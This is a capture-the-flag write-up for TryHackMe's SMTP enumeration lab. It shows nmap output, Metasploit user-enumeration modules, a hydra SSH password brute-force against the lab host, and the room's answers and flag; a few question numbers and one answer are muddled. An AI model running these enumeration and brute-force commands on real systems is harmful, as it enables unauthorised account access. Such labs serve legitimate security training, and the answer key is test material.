![](https://miro.medium.com/max/1400/1*2TtHSGMb8jaQMZYUF8RQ9g.png)

This is a writeup for [Network Services 2](https://tryhackme.com/room/networkservices2) room on tryhackme.

Enumerating SMTP
----------------

Spin up your target machine and let’s do an NMAP scan to see what ports are open

```
#nmap -Pn -sV -sC 10.10.114.123  
Starting Nmap 7.92 ( [https://nmap.org](https://nmap.org) ) at 2022-03-08 10:31 EST  
Nmap scan report for 10.10.114.123  
Host is up (0.42s latency).  
Not shown: 65093 closed tcp ports (reset), 440 filtered tcp ports (no-response)  
PORT   STATE SERVICE VERSION  
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)  
| ssh-hostkey:   
|   2048 62:a7:03:13:39:08:5a:07:80:1a:e5:27:ee:9b:22:5d (RSA)  
|   256 89:d0:40:92:15:09:39:70:17:6e:c5:de:5b:59:ee:cb (ECDSA)  
|\_  256 56:7c:d0:c4:95:2b:77:dd:53:d6:e6:73:99:24:f6:86 (ED25519)  
25/tcp open  smtp    Postfix smtpd  
|\_smtp-commands: polosmtp.home, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8  
| ssl-cert: Subject: commonName=polosmtp  
| Subject Alternative Name: DNS:polosmtp  
| Not valid before: 2020-04-22T18:38:06  
|\_Not valid after:  2030-04-20T18:38:06  
Service Info: Host:  polosmtp.home; OS: Linux; CPE: cpe:/o:linux:linux\_kernelService detection performed. Please report any incorrect results at [https://nmap.org/submit/](https://nmap.org/submit/) .  
Nmap done: 1 IP address (1 host up) scanned in 3806.97 seconds
```

1.  First, lets run a port scan against the target machine, same as last time. What port is SMTP running on?

```
25
```

2\. Okay, now we know what port we should be targeting, let’s start up Metasploit. What command do we use to do this?

```
msfconsole
```

After opening msfconsole, use the ‘search’ command to look for “smtp\_version”

3\. Let’s search for the module “smtp\_version”, what’s it’s full module name?

```
auxiliary/scanner/smtp/smtp\_version
```

Now use the ‘USE’ command to select the ‘smtp\_version’ module and use the ‘SHOW OPTIONS’ to set the remote hosts.

```
msf6 > use auxiliary/scanner/smtp/smtp\_version  
msf6 auxiliary(scanner/smtp/smtp\_version) > show optionsModule options (auxiliary/scanner/smtp/smtp\_version):Name     Current Setting  Required  Description  
   ----     ---------------  --------  -----------  
   RHOSTS                    yes       The target host(s), see [https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit](https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit)  
   RPORT    25               yes       The target port (TCP)  
   THREADS  1                yes       The number of concurrent threads (max one per host)msf6 auxiliary(scanner/smtp/smtp\_version) > set RHOSTS 10.10.114.123  
RHOSTS => 10.10.114.123  
msf6 auxiliary(scanner/smtp/smtp\_version) > set RPORT 25  
RPORT => 25  
msf6 auxiliary(scanner/smtp/smtp\_version) > run\[+\] 10.10.114.123:25      - 10.10.114.123:25 SMTP 220 polosmtp.home ESMTP Postfix (Ubuntu)\\x0d\\x0a  
\[\*\] 10.10.114.123:25      - Scanned 1 of 1 hosts (100% complete)  
\[\*\] Auxiliary module execution completed
```

4\. Great, now- select the module and list the options. How do we do this?

```
options
```

5\. Have a look through the options, does everything seem correct? What is the option we need to set?

```
RHOSTS
```

The exploit we just ran grabs the banner of the SMTP server, and also we can see it’s running ‘Postfix’

6\. Good! We’ve now got a good amount of information on the target system to move onto the next stage. Let’s search for the module “_smtp\_enum_”, what’s it’s full module name?

```
Postfix
```

Again use the ‘search’ command to search for smtp\_enum

7\. Good! We’ve now got a good amount of information on the target system to move onto the next stage. Let’s search for the module “_smtp\_enum_”, what’s it’s full module name?

```
auxiliary/scanner/smtp/smtp\_enum
```

use the ‘SET’ command to set the RHOSTS and USER\_FILE

```
msf6 auxiliary(scanner/smtp/smtp\_enum) > show optionsModule options (auxiliary/scanner/smtp/smtp\_enum):Name       Current Setting                                                Required  Description  
   ----       ---------------                                                --------  -----------  
   RHOSTS                                                                    yes       The target host(s), see [https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit](https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit)  
   RPORT      25                                                             yes       The target port (TCP)  
   THREADS    1                                                              yes       The number of concurrent threads (max one per host)  
   UNIXONLY   true                                                           yes       Skip Microsoft bannered servers when testing unix users  
   USER\_FILE  /usr/share/metasploit-framework/data/wordlists/unix\_users.txt  yes       The file that contains a list of probable users accounts.msf6 auxiliary(scanner/smtp/smtp\_enum) > set RHOSTS 10.10.125.23  
RHOSTS => 10.10.125.23  
msf6 auxiliary(scanner/smtp/smtp\_enum) > set USER\_FILE /usr/share/wordlists/SecLists-master/Usernames/top-usernames-shortlist.txt  
USER\_FILE => /usr/share/wordlists/SecLists-master/Usernames/top-usernames-shortlist.txt  
msf6 auxiliary(scanner/smtp/smtp\_enum) > run\[\*\] 10.10.125.23:25       - 10.10.125.23:25 Banner: 220 polosmtp.home ESMTP Postfix (Ubuntu)  
\[+\] 10.10.125.23:25       - 10.10.125.23:25 Users found: administrator  
\[\*\] 10.10.125.23:25       - Scanned 1 of 1 hosts (100% complete)  
\[\*\] Auxiliary module execution completed
```

8\. What option do we need to set to the wordlist’s path?

```
USER\_FILE
```

9\. Once we’ve set this option, what is the other essential paramater we need to set?

```
RHOSTS
```

11\. Okay! Now that’s finished, what username is returned?

```
administrator
```

Exploiting SMTP
---------------

We have found the username of the SMTP server, now let’s try to find the password with brute-forcing

```
**hydra -t 16 -l administrator -P /usr/share/wordlists/rockyou.txt -vV 10.10.125.23 ssh**
```

*   **\-t** for parallel connections for target
*   **\-l** for the username
*   **\-P** for the file containing passwords
*   **\-vV** to show the command output

and the attack\_machine IP followed by the protocol

```
\[22\]\[ssh\] host: 10.10.125.23   login: administrator   password: alejandro
```

1.  What is the password of the user we found during our enumeration stage?

```
alejandro
```

2\. Great! Now, let’s SSH into the server as the user, what is contents of smtp.txt

```
THM{who\_knew\_email\_servers\_were\_c00l?}
```

Thank you for reading.

🐾 Writeup on Network Services 2 MySql [https://richardphilipsroy.medium.com/network-services-2-mysql-tryhackme-7fb8ee180a98](https://medium.com/network-services-2-mysql-tryhackme-7fb8ee180a98)
